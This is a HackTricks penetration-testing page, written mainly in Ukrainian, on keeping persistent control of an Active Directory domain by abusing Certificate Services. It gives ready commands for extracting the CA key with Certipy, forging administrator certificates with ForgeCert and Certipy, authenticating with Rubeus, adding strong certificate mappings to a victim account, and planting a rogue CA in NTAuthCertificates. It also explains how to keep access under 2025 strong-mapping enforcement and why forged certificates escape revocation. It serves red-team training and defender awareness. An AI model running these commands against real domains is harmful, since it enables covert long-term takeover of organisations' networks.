# AD CS — персистенція в домені

{{#include ../../../banners/hacktricks-training.md}}

**Це підсумок технік персистенції в домені, описаних у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Перегляньте для детальнішої інформації.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

Як визначити, що сертифікат є CA-сертифікатом?

Сертифікат можна вважати CA-сертифікатом, якщо виконуються кілька умов:

- Сертифікат зберігається на сервері CA, а його приватний ключ захищений за допомогою DPAPI машини або апаратно (наприклад TPM/HSM), якщо ОС це підтримує.
- Поля Issuer і Subject сертифіката відповідають distinguished name CA.
- Розширення "CA Version" присутнє виключно в CA-сертифікатах.
- Сертифікат не містить полів Extended Key Usage (EKU).

Щоб витягти приватний ключ цього сертифіката, підтримуваним методом через вбудований GUI є інструмент `certsrv.msc` на сервері CA. Проте цей сертифікат не відрізняється від інших, що збережені в системі; отже, для витягнення можуть бути застосовані методи, такі як [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат та приватний ключ також можна отримати за допомогою Certipy, використавши наступну команду:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Отримавши сертифікат CA та його приватний ключ у форматі `.pfx`, можна використовувати інструменти на кшталт [ForgeCert](https://github.com/GhostPack/ForgeCert) для генерації дійсних сертифікатів:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Користувач, на якого націлена фальсифікація сертифіката, повинен бути активним і здатним пройти автентифікацію в Active Directory, щоб процес увінчався успіхом. Підробка сертифіката для спеціальних облікових записів, таких як krbtgt, неефективна.

Цей підроблений сертифікат буде **дійсним** до вказаної дати закінчення та доти, поки дійсний кореневий сертифікат CA (зазвичай від 5 до **10+ років**). Він також дійсний для **машин**, тож у поєднанні з **S4U2Self** атакуючий може **підтримувати персистенцію на будь-якій машині домену** стільки, скільки дійсний сертифікат CA.\
Крім того, **сертифікати, згенеровані** цим методом, **не можуть бути відкликані**, оскільки CA про них не знає.

### Робота в умовах Strong Certificate Mapping Enforcement (2025+)

З 11 лютого 2025 року (після розгортання KB5014754) контролери домену за замовчуванням використовують **Full Enforcement** для відображень сертифікатів. Практично це означає, що ваші підроблені сертифікати повинні або:

- Містити міцний зв’язок з цільовим обліковим записом (наприклад, SID security extension), або
- Бути поєднані з міцним, явним відображенням в атрибуті `altSecurityIdentities` цільового об’єкта.

Надійний підхід для персистенції — створити підроблений сертифікат, пов'язаний ланцюжком із вкраденим Enterprise CA, а потім додати міцне явне відображення до цільового principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- Якщо ви можете створити підроблені сертифікати, які містять SID security extension, вони будуть відображатися неявно навіть у режимі Full Enforcement. В іншому випадку віддавайте перевагу явним сильним відображенням. Див. [account-persistence](account-persistence.md) для докладнішої інформації про явні відображення.
- Revocation не допомагає захисникам у цій ситуації: підроблені сертифікати невідомі базі даних CA і тому не можуть бути відкликані.

## Trusting Rogue CA Certificates - DPERSIST2

Об'єкт `NTAuthCertificates` призначений для містити один або кілька **CA certificates** у своєму атрибуті `cacertificate`, які використовує Active Directory (AD). Процес перевірки контролера домену передбачає перевірку об'єкта `NTAuthCertificates` на наявність запису, що відповідає **CA specified** у полі Issuer автентифікуючого **certificate**. Якщо відповідність знайдена, аутентифікація продовжується.

Зловмисник може додати самопідписаний CA сертифікат до об'єкта `NTAuthCertificates`, якщо він контролює цей AD-об'єкт. Зазвичай дозволи на зміну цього об'єкта надаються лише членам групи **Enterprise Admin**, а також **Domain Admins** або **Administrators** у домені кореня лісу. Вони можуть редагувати об'єкт `NTAuthCertificates` за допомогою `certutil.exe` командою `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або використовуючи [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Можливості для **persistence** через модифікації **security descriptor** компонентів AD CS численні. Модифікації, описані в розділі "[Domain Escalation](domain-escalation.md)", можуть бути зловмисно реалізовані атакуючим із підвищеними привілеями. Це включає додавання "control rights" (наприклад, WriteOwner/WriteDACL/etc.) до таких чутливих компонентів, як:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

Приклад зловмисної реалізації: атакуючий з **підвищеними правами** додає право **`WriteOwner`** до дефолтного шаблону сертифікатів **`User`**, при цьому сам ставши суб'єктом для цього права. Щоб експлуатувати це, атакуючий спочатку змінює володіння шаблоном **`User`** на себе. Після цього на шаблоні встановлюється **`mspki-certificate-name-flag`** рівним **1**, щоб увімкнути **`ENROLLEE_SUPPLIES_SUBJECT`**, що дозволяє користувачу вказувати Subject Alternative Name в запиті. Надалі атакуючий може **enroll** за допомогою цього **template**, вказавши ім'я **domain administrator** як альтернативне ім'я, і використати отриманий сертифікат для автентифікації як DA.

Практичні налаштування, які атакуючі можуть встановити для довгострокової персистенції в домені (див. {{#ref}}domain-escalation.md{{#endref}} для повних деталей та детекції):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Довідник команд і використання forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
